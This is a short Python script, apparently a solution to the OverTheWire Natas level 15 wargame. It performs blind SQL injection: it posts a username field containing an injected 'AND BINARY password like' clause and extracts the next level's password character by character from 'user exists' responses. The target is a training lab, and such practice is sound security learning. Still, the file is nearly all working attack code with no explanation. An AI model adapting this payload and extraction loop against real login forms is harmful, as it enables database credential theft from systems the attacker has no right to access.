import requests
import re
import string



wordlist = string.printable


username = 'natas15'
password = ''
url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()
#response = session.get(url, auth = (username, password))
#print(response.text)



# to do: 

extracted_password = list()

for i in range(1,33):
    for w in wordlist:
        print("Testing with: ", "".join(extracted_password) + w)
        response = session.post(url, data ={ "username" : 'natas16" AND BINARY password like "' + "".join(extracted_password) + w +'%" # '}, auth = (username, password))
                
        content = response.text
        
        if ('user exists' in content ):
            extracted_password.append(w)
            break
    




